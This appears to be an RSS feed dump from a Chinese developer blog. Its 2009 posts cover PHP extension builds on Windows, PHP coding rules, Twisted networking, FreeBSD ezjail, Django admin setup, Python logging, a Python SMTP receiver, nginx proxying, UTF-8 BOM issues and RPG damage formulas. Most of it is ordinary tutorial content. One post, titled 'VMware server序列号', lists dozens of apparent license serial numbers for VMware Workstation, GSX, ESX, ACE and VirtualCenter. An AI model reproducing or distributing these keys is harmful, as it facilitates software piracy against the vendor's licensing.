1、修改文件 “PHP源文件目录/ext/ext_skel_win32.php”,在这里就是：E:\c_source_code\php-5.2.5\ext，其中主要是修改其中的cygwin路径。$cygwin_path = &amp;rsquo;e:\app\cygwin\bin&amp;rsquo;; 把$cygwin_path修改为你实际安装cygwin的路径。 2、在源代码ext目录也就是e:\c_source_code\php-5.2.5\ext下，执行 php ext_skel_win32.php &amp;ndash;extname=，此时会在ext目录下生成目录,这个目录就是我们将要进行PHP扩展开发的框架。比如你运行php.exe ext_skel_win32.php &amp;ndash;extname=foo，会在ext目录下生成foo目录。 3、将php-root\dev\php5ts.lib拷贝至 “ext/”中。比如你要开发的PHP扩展名为foo,那么就需要把php-root\dev\php5ts.lib拷贝到PHP源文件目录\ext\foo中。 4、修改foo.c内容，编写我们需要的C代码。 5、进入目录，打开.dsp。 设置VC6工程， 设置菜单“组建”-&amp;gt;“移除工程配置”，选中“Win 32 Release_TS”， 设置菜单“工程”，选中“Win 32 Release_TS” 打开Tab“连接”，设置“输出文件名”中的目录， [可选]打开Tab“C/C++”,增加“预处理器定义”“,COMPILE_DL_”（注意全大写，默认加入的），取消预定义“LIBZEND_EXPORTS”（否则不可引入zend函数）。 6、设置好以后，进行编译，会生成一个dll文件，文件名是.dll，比如在我们的例子中就为foo.dll 把foo.dll拷到e:\app\ext目录下，并在php.ini里加上一行extension=foo.dll，重启一下apache,查看phpinfo();，会发现我们的PHP扩展foo()已经加载进来，已经可以使用这个foo扩展了。
http://info.codepub.com/2008/08/info-21426.html</description>
    </item>
    
    <item>
      <title>(转)整理了一份比较全面的PHP开发编码规范</title>
      <link>http://example.org/2009/11/01/e8bdace695b4e79086e4ba86e4b880e4bbbde6af94e8be83e585a8e99da2e79a84phpe5bc80e58f91e7bc96e7a081e8a784e88c83/</link>
      <pubDate>Sun, 01 Nov 2009 14:44:30 +0000</pubDate>
      
      <guid>http://example.org/2009/11/01/e8bdace695b4e79086e4ba86e4b880e4bbbde6af94e8be83e585a8e99da2e79a84phpe5bc80e58f91e7bc96e7a081e8a784e88c83/</guid>
      <description>这些年来多从事Linux下PHP和C相关的开发，带过很多项目和团队，下面是根据经验整理的PHP编码规范，可以用作给大家的范例和参考，根据需要进行取舍和修改！
（可能最新的一些php5的规范不够完整，今后有机会保持更新！）
目录 1 编写目的 2 整体要求 3 安全规范 3.1 包含文件 3.1.1 命名规则 3.1.2 存放规则 3.2 安全规则 3.3 一些针对PHP的规则 3.4 其它处理规则 3.4.1 对输入参数值进行转义处理 3.4.2 操作大HTML文本
4 编码规范 4.1 命名规范 4.1.1 变量命名 4.1.2 类 4.1.3 方法或函数 4.1.4 缩写词 4.1.5 数据库表名 4.1.6 数据库字段 4.2 书写规则 4.2.1 代码缩进 4.2.2 大括号{ }书写规则 4.2.3 小括号( )和函数、关键词等 4.2.4 ＝符号书写 4.2.5 if else swith for while等书写 4.2.6 类的构造函数 4.2.7 语句断行, 每行控制在80个字符以内 4.2.8 不要不可思议的数字 4.2.9 true/false和0/1判断 4.2.10 避免嵌入式赋值 4.</description>
    </item>
    
    <item>
      <title>一个典型的Twisted应用程序框架</title>
      <link>http://example.org/2009/10/27/e4b880e4b8aae585b8e59e8be79a84twistede5ba94e794a8e7a88be5ba8fe6a186e69eb6/</link>
      <pubDate>Tue, 27 Oct 2009 03:56:27 +0000</pubDate>
      
      <guid>http://example.org/2009/10/27/e4b880e4b8aae585b8e59e8be79a84twistede5ba94e794a8e7a88be5ba8fe6a186e69eb6/</guid>
      <description>一、简介
本文通过继承Twisted中的一些类实现了一个基本的Twisted应用程序，期间实现了协议、工厂并进行了服务器的监听，并将日志输出的屏幕。
二、基本框架
·导入部分
这部分导入的内容是专供协议和工厂类使用的，其他部分的导入可能并不在同一模块当中，所以到了具体的代码部分再去导入。
from twisted.internet import protocol
from twisted.protocols import basic
·协议
继承了一个LineReceiver，实现了行和原始两种方式的数据接收处理，还重载了连接的建立和断开事件。
class ConfigServer(basic.LineReceiver):
def __init__(self): pass #by gashero def dataReceived(self,data): pass def lineReceived(self,line): pass def connectionMade(self): pass def connectionLost(self,reason): pass ·工厂
继承了一个服务器工厂，
class ConfigServerFactory(protocol.ServerFactory):
protocol=ConfigServer def __init__(self): pass def startFactory(self): pass def stopFactory(self): pass def buildProtocol(self,addr): protocol.ServerFactory.buildProtocol(self,addr) pass ·设置日志
from twisted.python import log
import sys
log.startLogging(sys.stdout)
·启动服务器
from twisted.internet import reactor
reactor.listenTCP(8080,ConfigServerFactory(),timeout=10)
reactor.run()
三、其他常用方法
·发送数据，在协议对象的方法中
self.transport.write(data)</description>
    </item>
    
    <item>
      <title>Setup FreeBSD Jail With ezjail</title>
      <link>http://example.org/2009/10/24/setup-freebsd-jail-with-ezjail/</link>
      <pubDate>Sat, 24 Oct 2009 06:06:18 +0000</pubDate>
      
      <guid>http://example.org/2009/10/24/setup-freebsd-jail-with-ezjail/</guid>
      <description>How do I setup operating system-level virtualization that allows me to partition my FreeBSD-based server system into several independent mini-systems called jails.? I&amp;rsquo;d like to set one jail for mail and another for web server via 2 public IP address.
Each jail under FreeBSD virtual environment runs on the host machine with its own files, processes, user and superuser accounts. From within a jailed process, the environment is almost indistinguishable from a real system.</description>
    </item>
    
    <item>
      <title>Jail: Create</title>
      <link>http://example.org/2009/10/24/jail-create/</link>
      <pubDate>Sat, 24 Oct 2009 06:05:22 +0000</pubDate>
      
      <guid>http://example.org/2009/10/24/jail-create/</guid>
      <description>Creating a jail with EZJail PrefaceAlthough you can maintain your FreeBSD jails manually and there are quite a few tutorials around, I like the implementation done through EZJails.
It&amp;rsquo;s assumed you have completed installing FreeBSD and EZJail.
Creating/Starting a JailTo create the jail we need to create an alias for the network interface, issue the ezjail-admin create command w/flavor, and finally start the jail:
ifconfig lnc0 192.168.1.50 netmask 255.255.255.255 alias ezjail-admin create -f standard www.</description>
    </item>
    
    <item>
      <title>twisted知识</title>
      <link>http://example.org/2009/10/23/twistede79fa5e8af86/</link>
      <pubDate>Fri, 23 Oct 2009 10:15:37 +0000</pubDate>
      
      <guid>http://example.org/2009/10/23/twistede79fa5e8af86/</guid>
      <description>一、Twisted基本模型 Twisted 网络编程框架是一种基于事件的网络编程框架，用户需要继承特定的类，并重载其中的方法来处理网络通信
中可能出现的各种情况。
Twisted的网络通信模型 最基本的也要由三部分组成：反应器(reactor)、协议(protocol)、工厂(factory)。
1、其中反应器reactor用来执行事件循环，分发事件处理等 等，每个应用程序中一般只能启动一个reactor。 2、协议用来完成与一个已经连接成功的主机的交互功能，主要有数据的接收和发送功能。连接的断开事件也可以在这
里处理。注意是在连接建立之后protacal才开始负责下面的工作的。 3、工厂负责与一个协议的启动和关闭功能，而且还负责在连接成功时生成一个协议对象，(by gashero)用于与远程主
机的交互功能。
一个典型的Twisted应用程序会建立至少一个协议，可以从twisted.internet.protocol.BaseProtocol类或其子类继承
。协议还需要实现数据的接收处理，即收到数据之后需要做出何种响应。比较简单的Twisted应用程序可以继承一个空
的工厂，来自 twisted.internet.protocol.Factory或其子类。工厂至少应该指定protocol属性，指向协议类。最后
就是要启动事件 循环，根据连接方向的不同，可以选择用reactor的connectXXX()或listenXXX()方法，然后执行
reactor.run()启动 事件循环。
二、协议模型 所有协议类的基类是 twisted.internet.protocol.BaseProtocol，但是一般使用其子类。不同的协议子类提供了不同
的数据接收方法，如 LineReceiver子类就允许同时使用行和原始数据两种方法接收数据，使用非常方便。
BaseProtocol的接口如下： class BaseProtocol: connected=0 #是否已经连接了 transport=None #用于数据发送的传输对象 def makeConnection(self,transport): #建立连接的方法，不是事件方法，一般不要重载 def connectionMade(self): #连接成功事件，可重载 可以看到BaseProtocol可以理解为一个虚基类，实现的功能十分简陋。实际的应用程序一般也不是直接继承BaseProtocol来实现协议，而是继承Protocol类。Protocol类提供了基本完善的协议功能，接口定义如下：
class Protocol(BaseProtocol): def dataReceived(self,data): #接收到数据事件，可重载 def connectionLost(self,reason=connectionDone): #连接断开事件，可重载，依靠reason区分断开类型
从Protocol类继承就可以完成协议的基本处理了，包括连接的建立和断开事件，还有数据接收事件。
三、工厂模型 相对于协议，工厂可以发挥的空间就很小了。所有工厂的基类是twisted.internet.protocol.Factory。这个类定义了三个方法，接口如下： class Factory: protocol=None #指向一个协议类 def startFactory(self): #开启工厂 def stopFactory(self): #关闭工厂 def buildProtocol(self,addr): #构造协议对象，并给协议对象添加一个factory属性指向工厂，可以重载 从 这里可以看到，工厂类中最重要的部分就是protocol属性，将这个属性设置为一个协议类(注意不是协议对象)，就
可以将这个工厂设置为对应协议的工厂 了。前两个方法控制工厂的开启和关闭，用于资源的初始化和释放，可以重载
。buildProtocol()方法可以控制协议对象的生成，(by gashero)如果需要多传递一个属性，可以重载，但是重载时应</description>
    </item>
    
    <item>
      <title>开始正式步入广州</title>
      <link>http://example.org/2009/10/11/e5bc80e5a78be6ada3e5bc8fe6ada5e585a5e5b9bfe5b79e/</link>
      <pubDate>Sun, 11 Oct 2009 15:16:41 +0000</pubDate>
      
      <guid>http://example.org/2009/10/11/e5bc80e5a78be6ada3e5bc8fe6ada5e585a5e5b9bfe5b79e/</guid>
      <description>在珠海呆了两个多月了，今天正式进入广州，中午到了这边下午就开始找房，不过结果还不错，这都归于陈公子的英明神武哦呵呵。 不过还不知道在这里能呆多久，本来印象对这个城市没有什么好感的，但今天稍改变一下，感觉也还可以，没有像人说的那么恐怖呵呵，不管了，先睡了，明天还要尽快呢，累死了。</description>
    </item>
    
    <item>
      <title>python的logging  [转自python mail list]</title>
      <link>http://example.org/2009/10/08/pythone79a84logging-e8bdace887aapython-mail-list/</link>
      <pubDate>Thu, 08 Oct 2009 16:55:03 +0000</pubDate>
      
      <guid>http://example.org/2009/10/08/pythone79a84logging-e8bdace887aapython-mail-list/</guid>
      <description>我们知道在java或者.net中大部分都是使用apache的log4&amp;hellip;, python里面本身就自带了logging模块。同样在django中也可以用：
1.Setting.py中设置
LOG_FILE = &amp;quot;log.log&amp;quot; 2.创建utils/log.py:
import logging from django.conf import settings def getlog(): logger = logging.getLogger() hdlr = logging.FileHandler(settings.LOG_FILE) formatter = logging.Formatter(&#39;%(asctime)s %(levelname)s % (message)s&#39;) hdlr.setFormatter(formatter) logger.addHandler(hdlr) logger.setLevel(logging.NOTSET) return logger 3.使用：
from utils import log log.getlog().debug(&amp;quot;dddddd&amp;quot;) 你就可以看到你的django project的根目录下有一文件log.log 2007-02-13 07:02:07,780 DEBUG dddddd
更多参考: http://www.onlamp.com/pub/a/python/2005/06/02/logging.html On 2/13/07, map...@gmail.com wrote:
我们知道在java或者.net中大部分都是使用apache的log4&amp;hellip;, python里面本身就自带了logging模块。同样在django中也可以用：
嗯嗯嗯!比俺使用的聪明,俺是生硬的直接使用 每个需要的py 中:
import logging logging.basicConfig(level=logging.DEBUG, format=&#39;[%(asctime)s]%(levelname)-8s&amp;quot;%(message)s&amp;quot;&#39;, datefmt=&#39;%Y-%m-%d %a %H:%M:%S&#39;, filename=&#39;bo_update.log&#39;, filemode=&#39;a+&#39;) ... logging.debug(&amp;quot;Line: %s updated...&amp;quot; % (line_ref)) 实际应用时建议使用</description>
    </item>
    
    <item>
      <title>接收邮件的smtpserver</title>
      <link>http://example.org/2009/10/05/e68ea5e694b6e982aee4bbb6e79a84smtpserver/</link>
      <pubDate>Mon, 05 Oct 2009 14:12:51 +0000</pubDate>
      
      <guid>http://example.org/2009/10/05/e68ea5e694b6e982aee4bbb6e79a84smtpserver/</guid>
      <description>一个可以接收邮件的smtpserver. 收到的邮件被存为一个eml格式的文件，可以用outlook打开。 注意： 需要事先配置域名，指向这台机器所在的IP。免费的动态域名（如花生壳）也可。
#encoding:utf-8 from datetime import datetime import asyncore from smtpd import SMTPServer class EmlServer(SMTPServer): no = 0 def process_message(self, peer, mailfrom, rcpttos, data): filename = &#39;%s-%d.eml&#39; % (datetime.now().strftime(&#39;%Y%m%d%H%M%S&#39;),self.no) f = open(filename, &#39;w&#39;) f.write(data) f.close print mailfrom,rcpttos,&#39;%s saved.&#39; % filename self.no += 1 def run(): foo = EmlServer((&#39;0.0.0.0&#39;, 25), None) try: asyncore.loop() except KeyboardInterrupt: pass if __name__ == &#39;__main__&#39;: run() 转自 http://www.javaeye.com/topic/382229</description>
    </item>
    
    <item>
      <title>django Admin管理界面的激活方法,The Django Admin Site problem(No module named urls)</title>
      <link>http://example.org/2009/09/30/django-admine7aea1e79086e7958ce99da2e79a84e6bf80e6b4bbe696b9e6b395the-django-admin-site-problemno-module-named-urls/</link>
      <pubDate>Wed, 30 Sep 2009 10:02:50 +0000</pubDate>
      
      <guid>http://example.org/2009/09/30/django-admine7aea1e79086e7958ce99da2e79a84e6bf80e6b4bbe696b9e6b395the-django-admin-site-problemno-module-named-urls/</guid>
      <description>problem description: 1，向你的模型添加admin metadata 并不是所有的模型都可以或者应该被admin用户编辑，所以你需要标记那些需要管理界面的模型 上一章的Book模型添加一个管理界面的方法就是：
class Book(models.Model): title = models.CharField(maxlength=100) authors = models.ManyToManyField(Author) publisher = models.ForeignKey(Publisher) publication_date = models.DateField() class Admin: pass Admin声明标记这个类拥有一个管理界面，在Admin之下你可以配置许多选项 目前我们采用默认值，所以我们使用pass来表示Admin类是空的 如果你正在按这个例子写自己的代码，现在给Publisher和Author类添加Admin声明是个好主意 2，安装admin模型，简单的把&amp;quot;django.contrib.admin&amp;quot;添加到你的INSTALLED_APPS设置里 然后运行python manage.py syncdb来安装admin使用的额外的表 注意，在你第一次运行syncdb时，你很可能被问起是否创建一个superuser 如果那时你没有创建superuser，你需要运行djang/contrib/auth/bin/create_superuser.py 来创建一个admin用户，否则你就不能登录到管理界面里去 3，把URL模式添加到urls.py，如果仍在使用startproject创建的工程，admin的URL模式可能 已经在那儿了，但是被注释掉了，你的URL模式应该像这样：
from django.conf.urls.defaults import * urlpatterns = patterns(&#39;&#39;, (r&#39;^admin/&#39;, include(&#39;django.contrib.admin.urls&#39;)), ) 就这样，现在运行python manage.py runserver来启动服务器，你将看到如下信息： Validating models&amp;hellip; 0 errors found.
Django version 0.96-pre, using settings &amp;lsquo;mysite.settings&amp;rsquo; Development server is running at http://127.0.0.1:8000/ Quit the server with CONTROL-C.</description>
    </item>
    
    <item>
      <title>mydns-ng mydns 的后继版</title>
      <link>http://example.org/2009/09/30/mydns-ng-mydns-e79a84e5908ee7bba7e78988/</link>
      <pubDate>Wed, 30 Sep 2009 03:33:28 +0000</pubDate>
      
      <guid>http://example.org/2009/09/30/mydns-ng-mydns-e79a84e5908ee7bba7e78988/</guid>
      <description>无意间在 ports 看到 mydns-ng
MyDNS-ng is a free DNS server for UNIX. It was implemented from scratch and is designed to serve records directly from an SQL database (currently either MySQL or PostgreSQL).
MyDNS-ng is based on MyDNS originaly writen by Don Moore bboy@bboy.net Oficial Site http://mydns.bboy.net.
MyDNS is licensed under the GNU General Public License.
以后可以用它了</description>
    </item>
    
    <item>
      <title>在Windows上安装Python&#43;MySQL 的常见问题及解决方法</title>
      <link>http://example.org/2009/09/28/e59ca8windowse4b88ae5ae89e8a385pythonmysql-e79a84e5b8b8e8a781e997aee9a298e58f8ae8a7a3e586b3e696b9e6b395/</link>
      <pubDate>Mon, 28 Sep 2009 13:35:38 +0000</pubDate>
      
      <guid>http://example.org/2009/09/28/e59ca8windowse4b88ae5ae89e8a385pythonmysql-e79a84e5b8b8e8a781e997aee9a298e58f8ae8a7a3e586b3e696b9e6b395/</guid>
      <description>验证是否已经安装了MySQLdb：
==========================================================
d:\usr\local\Python25&amp;gt;python Python 2.5.4 (r254:67916, Dec 23 2008, 15:10:54) [MSC v.1310 32 bit (Intel)] onwin32 Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information. &amp;gt;&amp;gt;&amp;gt; import MySQLdb Traceback (most recent call last): File &amp;quot;&amp;lt;stdin&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt; ImportError: No module named MySQLdb ========================================================== 如果有类似于上面的&amp;quot;No module named MySQLdb&amp;quot;，表明MySQLdb尚未安装或安装的不成功！
MySQL 版本：5.0.67 下载地址：http://dev.mysql.com/downloads/mysql/5.0.html#downloads 下载exe文件并安装
==========================================================
Python 版本：2.5 下载地址：http://www.python.org/download/releases/2.5.4/ 下载msi文件并安装
MySQLdb版本： MySQLdb Windows binary for Python 2.5 下载地址：http://biohackers.net/wikiattach/Python2(2e)5/attachments/MySQL-python.exe-1.2.1_p2.win32-py2.5.exe 参见：http://forums.mysql.com/read.php?50,129618,140611#msg-140611
常见问题： 1.无法定位程序输入点 mysql_server_init 于动态链接库 LIBMYSQL.</description>
    </item>
    
    <item>
      <title>nginx做透明代理</title>
      <link>http://example.org/2009/09/23/nginxe5819ae9808fe6988ee4bba3e79086/</link>
      <pubDate>Wed, 23 Sep 2009 14:49:23 +0000</pubDate>
      
      <guid>http://example.org/2009/09/23/nginxe5819ae9808fe6988ee4bba3e79086/</guid>
      <description>resolver 208.67.222.222;
server { listen 8080; location / { proxy_pass http://$http_host$request_uri; } } 真是简单了，</description>
    </item>
    
    <item>
      <title>BOM--字节序标记</title>
      <link>http://example.org/2009/09/23/bom-e5ad97e88a82e5ba8fe6a087e8aeb0/</link>
      <pubDate>Wed, 23 Sep 2009 02:00:18 +0000</pubDate>
      
      <guid>http://example.org/2009/09/23/bom-e5ad97e88a82e5ba8fe6a087e8aeb0/</guid>
      <description>读代码的时候看到这样一段 $template_content = str_replace(&amp;quot;\xEF\xBB\xBF&amp;quot;, &amp;lsquo;&amp;rsquo;, $template_content); 不知道是何作用,经过一番查找资料,终于解开了这个疑问 资料如下:
在window下面用记事本编辑文件的时候，如果保存为UNICODE或UTF-8，分别会在文件的开头加上两个字节“\xFF\xFE”和三个字节“\xEF\xBB\xBF”。在读取的时候就可能会遇到问题，但是不同的环境对这几个多于字符的处理也不一样。(其他的文本编辑工具也存在这个问题,但是可以选择去除bom,如editplus的设置:参数选择-&amp;gt;文件-&amp;gt;utf-8, 选择总是删除签名) 如果前面三个字符“\xef\xbb\xbf”则保存格式是utf-8 如果前两个字符是“\xff\xfe”则保存格式是Unicode Unicode规范中有一个BOM的概念。 BOM——Byte Order Mark，就是字节序标记。在这里找到一段关于BOM的说明： 在UCS 编码中有一个叫做&amp;quot;ZERO WIDTH NO-BREAK SPACE&amp;quot;的字符，它的编码是FEFF。而FFFE在UCS中是不存在的字符，所以不应该出现在实际传输中。UCS规范建议我们在传输字节流前，先传输字符&amp;quot;ZERO WIDTH NO-BREAK SPACE&amp;quot;。这样如果接收者收到FEFF，就表明这个字节流是Big-Endian的；如果收到FFFE，就表明这个字节流是Little- Endian的。因此字符&amp;quot;ZERO WIDTH NO-BREAK SPACE&amp;quot;又被称作BOM。 UTF-8不需要BOM来表明字节顺序，但可以用BOM来表明编码方式。字符&amp;quot;ZERO WIDTH NO-BREAK SPACE&amp;quot;的UTF-8编码是EF BB BF。所以如果接收者收到以EF BB BF开头的字节流，就知道这是UTF-8编码了。Windows就是使用BOM来标记文本文件的编码方式的。 容易导致header session_star ob_start的问题,utf－8编码的文件中，BOM占3个字节，由于php设计时没有考虑BOM的问题，这三个字节会直接输出，如果这时在程序里调用了session函数，就会出问题了 附：文件应该使用 Unicode (UTF-8) 编码保存。同时不要使用 字节序标记(BOM) 。与 UTF-16 和 UTF-32 不同，UTF-8 编码的文件不需要指明字节序，而且 字节序标记(BOM) 在PHP中会产生预期之外的输出，阻止了应用程序设置它自己的 头信息。应该使用Unix 格式的行结束符(LF)。</description>
    </item>
    
    <item>
      <title>VMware server序列号</title>
      <link>http://example.org/2009/09/10/vmware-servere5ba8fe58897e58fb7/</link>
      <pubDate>Thu, 10 Sep 2009 06:12:35 +0000</pubDate>
      
      <guid>http://example.org/2009/09/10/vmware-servere5ba8fe58897e58fb7/</guid>
      <description>VMware Workstation4.5.2 Build 8848 for Windows
ZHDH1-UR90N-W844G-4PTN6
G1NP0-T88AL-M016F-4P8N2
VMware-workstation-4.5.2-8848 for Linux
ZC14J-4U16A-0A04G-4MEZP
J1WF8-58LDE-881DG-4M8Q3
VMware Workstation 5 For Windows
LUXRM-WP0DN-A256U-4M9Q3
DJXDR-NDT27-Y2NDU-4YTZK
VMware Workstation 5 for Linux
DA925-HP80U-Z8HDC-4WXXP
3KW2W-AYR2C-88M6F-4MDQ2
VMware.GSX.Server.3.1.0-9089.for.Windows
98XY4-54VA4-4216V-4PDZ6
WH0M5-XW50J-WA4FU-4MTZ3
VMware-gsx-server-3.1.0-9089.for Linux
N218N-NR66R-F0JDF-4P9NP
H2W8H-X82DC-J8N6G-4M9Q6
VMWare ESX Server 2.x
0VHD0-0P86V-0C0AH-4018N SMP 0KR08-02CAH-0DJ2H-48124
02M8R-0HA2N-0CK8M-42JAN SMP 0AMDE-0UWFP-0E601-42J84
VMware Ace 1.0.0
admin:8H18E-8U505-HA14Z-4P8QL
RCT0X-XHN8U-H20FY-4W9ZP
player:WC94X-3H90R-K05DU-4MTN3
DHHF8-K0P6P-Z25DY-4YENK
workstation:TKN8T-1UD2Q-70N4C-4YXXQ
AJMMN-3YUDP-8ANFG-4WWX2
VMware VirtualCenterV1.2.0
[attach]1150[/attach]
VC管理GSX的SN：
QU9HW-NM5FT-VAJ4G-5W9N3
VHM05-U0Q27-E0HFA-5WRXL
virtualcenter 最全和最强的license
virtualcenter : 921H4-7WR4V-T2NDC-5YDZK
vmotion : 8VN44-Q8PD9-P0NFY-5PWZL
esx： XL584-9PH2Z-02H4C-5P9XL
gsx: EH8M0-5RP8Y-M804F-5MRN3</description>
    </item>
    
    <item>
      <title>Python代码加密 源码保护--pyc文件&#39;字节码&#39;</title>
      <link>http://example.org/2009/09/09/pythone4bba3e7a081e58aa0e5af86-e6ba90e7a081e4bf9de68aa4-pyce69687e4bbb6e5ad97e88a82e7a081/</link>
      <pubDate>Wed, 09 Sep 2009 05:55:39 +0000</pubDate>
      
      <guid>http://example.org/2009/09/09/pythone4bba3e7a081e58aa0e5af86-e6ba90e7a081e4bf9de68aa4-pyce69687e4bbb6e5ad97e88a82e7a081/</guid>
      <description>内容概要:Python代码加密,源码保护,代码保护,pyc文件 关于python代码保护在网上好像一直没有很好的介绍,可能和PYTHON的设计初衷&amp;quot;开源&amp;quot;有关,但越来越多的兄弟写的加入PYTHON阵营,开发工具用途各异,在商业应用中代码保护就变的重要了. 下面介绍一下发布PYC文件,做简单代码保护 PYC文件是什么? pyc文件是python的二进制编译,pyc文件比py文件拥有更快的装载速度，执行速度没有区别。 因为pyc文件是二进制文件,不是明文显示,利用这一特性,发布PYC文件隐藏源代码.
命令如下: python -c &amp;ldquo;import compileall; compileall.compile_dir(&amp;lsquo;目录&amp;rsquo;)&amp;rdquo;
该命令可以为一个目录下的py文件生成pyc文件（包含子目录） 在windows平台上的路径书写方式为(&amp;lsquo;C:/python26/pyc&amp;rsquo;)
下面符一完整命令: 将目录&amp;rsquo;C:/python26/pyc&amp;rsquo;下的所有PY文件 转为PYC文件
python -c &amp;quot;import compileall; compileall.compile_dir(&#39;C:/python26/pyc&#39;)&amp;quot; 如果想实现真正的加密代码,就要改PYTHON源码,做自己的加密模块了,这方面还没深入了解,不便多说. 关于代码加密这块如哪位兄弟还有更好的方法,请多指教.
Python代码加密,源码保护,代码保护,pyc文件
转自http://blog.alexa-pro.cn/?p=349</description>
    </item>
    
    <item>
      <title>错误734:PPP链接控制协议终止</title>
      <link>http://example.org/2009/09/05/e99499e8afaf734pppe993bee68ea5e68ea7e588b6e58d8fe8aeaee7bb88e6ada2/</link>
      <pubDate>Sat, 05 Sep 2009 15:26:15 +0000</pubDate>
      
      <guid>http://example.org/2009/09/05/e99499e8afaf734pppe993bee68ea5e68ea7e588b6e58d8fe8aeaee7bb88e6ada2/</guid>
      <description>今天无聊拿手机和电脑蓝牙连接通过 gprs 上网试一下，不料确遇到这个错误，在网上找了一下
在硬件设备里面找到手机MODEM的驱动，点属性，找到额外初始化命令，填入
AT+CGDCONT=1,&amp;quot;IP&amp;quot;,&amp;quot;CMNET&amp;quot; 不错，可以正常上网了,不过我的上网方式不区分 wap 和 net 所以用的 net 呵呵</description>
    </item>
    
    <item>
      <title>精华游戏算法整理——关于SLG中人物可到达范围计算的想法</title>
      <link>http://example.org/2009/08/22/e7b2bee58d8ee6b8b8e6888fe7ae97e6b395e695b4e79086e28094e28094e585b3e4ba8eslge4b8ade4babae789a9e58fafe588b0e8bebee88c83e59bb4e8aea1/</link>
      <pubDate>Sat, 22 Aug 2009 18:01:06 +0000</pubDate>
      
      <guid>http://example.org/2009/08/22/e7b2bee58d8ee6b8b8e6888fe7ae97e6b395e695b4e79086e28094e28094e585b3e4ba8eslge4b8ade4babae789a9e58fafe588b0e8bebee88c83e59bb4e8aea1/</guid>
      <description></description>
    </item>
    
    <item>
      <title>RPG&amp;SRPG伤害式计算方式杂谈</title>
      <link>http://example.org/2009/08/22/rpgsrpge4bca4e5aeb3e5bc8fe8aea1e7ae97e696b9e5bc8fe69d82e8b088/</link>
      <pubDate>Sat, 22 Aug 2009 17:54:28 +0000</pubDate>
      
      <guid>http://example.org/2009/08/22/rpgsrpge4bca4e5aeb3e5bc8fe8aea1e7ae97e696b9e5bc8fe69d82e8b088/</guid>
      <description>以下的损伤式，如果没有特别指明的话，一般讨论的都是普通物理攻击的损伤。魔法攻击、特殊攻击暂不考虑。
基本型： 损伤＝攻击力－防御力 其中，攻击力一般要分为人物自身的攻击力和武器的攻击力，所以又有： 损伤＝人物攻击力＋武器攻击力－防御力 防御力当然也可以分为人物的和防具的： 损伤＝（人物攻击力＋武器攻击力）－（人物防御力＋防具防御力） 但也有个别游戏在这里选择了简化。最典型的就是FE系列。 这种基本型的一个重要之处，是人物攻击力和武器攻击力的重要性要平衡好。 以FE为例，人物部分最大值在20～30左右，而武器也一般在这个数值附近。使得二者的作用基本是对半分，其中武器的值一般略低于人物的值。 而且因为FE的数值都偏小，加上必杀的大损伤、敌人的能力值不十分高、武器的损耗等因素，使得一些初级的武器能一直使用到后期。比如776中，攻击力只有6的铁剑就能一直比较活跃。 反之，如果游戏中的人物能力值数值很高，变化很大，而损伤公式仍然是基本型的话，则存在一个武器不断替换的问题。 比如SN3，人物的能力值由开始的几十升至最后的几百，在人物能力值不同提升的同时，装备也一批一批的被更换。游戏最开始时入手的是攻击力只有十几的武器，而到最后入手的武器攻击力均在二百左右。如此的话，初期和中期入手的武器在后期是肯定不会考虑使用的。造成了武器之间的强弱等级差别很大，略失真实性。但更多的RPG都情愿采取这样的模式，因为装备的不断替换更能体现出RPG的育成、增强的感觉。 基本型的损伤式看似简单，但实际游戏中往往还要加上各种系数修正。最常见的是乱数的修正，而像SN3般虽然没有乱数影响，却也有着攻击方向、高低差、距离等因素影响，其结果并非都像FE般能比较精确地预测。
关于防御力： 防具的防御力还好理解，人物自身的防御就实在很难解释是怎样的一个概念……再强的肌肉，在刀剑面前也不见得能有多少抵抗力。所以有不少游戏采取的是只有防具防御力，没有人物防御力的做法。但仍然有很多的游戏保留着人物的防御力。看着穿布服的人用肉身承受数十下刀砍，真不知道是什么感觉&amp;gt;_ 人物的力气和武器攻击力之间的作用关系，也一直是一个很难解释清楚的地方。按基本型的算法，只需2者之和超过对方的防御力，即使其中一者低到何种程度，也确实能给对方造成损伤。不过也有着很多游戏，对武器攻击力和人物攻击力采取的是不同的算法，这就是下面要介绍的系数型……
系数型： 人物攻击力和武器攻击力的平衡是损伤公式相当重要的一个环节。系数型与基本型最大的区别就在这里：系数型中，人物攻击力和武器攻击力不再是简单的相加关系，而是将人物能力对攻击力的影响作为系数作用在武器攻击力之上。 如下便是系数型最基本的形态： 损伤＝（武器攻击力－防具防御力）×人物能力系数 这样的基本公式，被FF系列数代所采用。 系数型的计算比基本型略为复杂，损伤结果更难预测，尤其是数值比较大时更是如此。 但其实从设计者的角度，系数型的数值设定却不一定就比基本型的复杂。 系数型和基本型的区别，主要在如下的一些方面： 1、基本型自始至终都要控制好人物能力和装备能力之间的关系，而系数型因为将这二者的算法分开，便能将这二者由不同的角度去控制。 拿776来说，如果将攻击力为6的武器换为攻击力12的武器，给损伤带来的影响仍然会因为使用者的力气而有很大区别。如果人物的力为6，那么损伤增至原来的150％。但如果人物的力为20，则损伤的增加仅为原来的123％。 但对系数型来说，武器攻击力由6变为12，则意味着损伤一定是原来的200％。就是说武器攻击力的变化和人物能力的变化是比较独立地分别作用在总损伤值之上的。 2、通过控制不同时点获得的武器和防具，能将（武器攻击力－防具防御力）这一项始终稳定在一个范围之内，再通过能力值对攻击系数和HP上升这2者关系的影响公式，就能最终保证在所有数值不断增加的同时，损伤值能比较稳定地得到平衡。而正是武器攻击力和防具防御力直接作用的这个特点，为游戏带来了这样的特性：一旦防具防御力高于武器攻击力，无论系数多大，也不会有任何影响了，损伤固定为0。一般在系数型的公式算法下，高防御力的作用更容易被突出。如果是基础型的公式，尤其是那种忽略了人物防御力的公式，很容易出现到了后期各项数值都很高时，防御力的作用越来越被减弱的现象。 用系数型损伤式的游戏，最典型的就是FF9。FF9中人物能力系数在很多情况下就直接等于人物的力气值。 FF5也是系数型的代表，不过跟FF9相比，系数值除了力气的影响外，还加入了人物等级的影响。这是很多RPG，尤其是现在难度越发偏低的RPG惯用的方法。因为FF系列的能力成长很多都不是采取跟等级同步上升的方式，损伤有了等级的直接影响，对于一些不太熟悉系统的玩家，最起码还能靠练级来直接增强实力-_- FF5的基本物理、魔法攻击系数计算式： 物理系数：(LV×力/128)+2 魔法系数：(LV×魔力/256)+4 最后附加的2和4可以看作系数的基本值，作用是保证攻击威力的程度，不至于lv、力/魔力都很低时完全没有损伤。
